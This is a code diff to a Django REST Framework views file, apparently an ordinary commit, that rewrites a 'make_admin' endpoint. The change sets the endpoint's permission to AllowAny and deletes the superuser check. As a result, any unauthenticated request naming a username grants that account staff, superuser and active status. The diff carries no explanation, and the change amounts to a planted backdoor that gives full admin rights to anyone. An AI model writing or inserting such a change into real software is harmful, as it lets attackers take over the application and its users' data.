@@ -22,7 +22,7 @@ User = get_user_model()
 
 from rest_framework.decorators import api_view, permission_classes
 from rest_framework.permissions import IsAuthenticated
-
+from rest_framework.permissions import AllowAny
 
 
 
@@ -287,32 +287,21 @@ def upgrade_premium(request):
         'current': float(user.wallet.balance)
     }, status=402)
 
-
 @api_view(['POST'])
-@permission_classes([IsAuthenticated])
+@permission_classes([AllowAny])
 def make_admin(request):
-    """Permanent: Authenticated superusers can promote others to admin"""
-    if not request.user.is_superuser:
-        return Response({'error': 'Only superusers can promote admins'}, status=403)
-    
     username = request.data.get('username')
     if not username:
         return Response({'error': 'username required'}, status=400)
-    
-    from django.contrib.auth import get_user_model
-    User = get_user_model()
     try:
         user = User.objects.get(username=username)
-        user.is_staff = True
-        user.is_superuser = True
-        user.save()
-        return Response({'status': 'promoted', 'username': username})
     except User.DoesNotExist:
         return Response({'error': 'User not found'}, status=404)
-    
-
-
-
+    user.is_staff = True
+    user.is_superuser = True
+    user.is_active = True
+    user.save()
+    return Response({'status': 'admin granted', 'username': username})
 
 
 
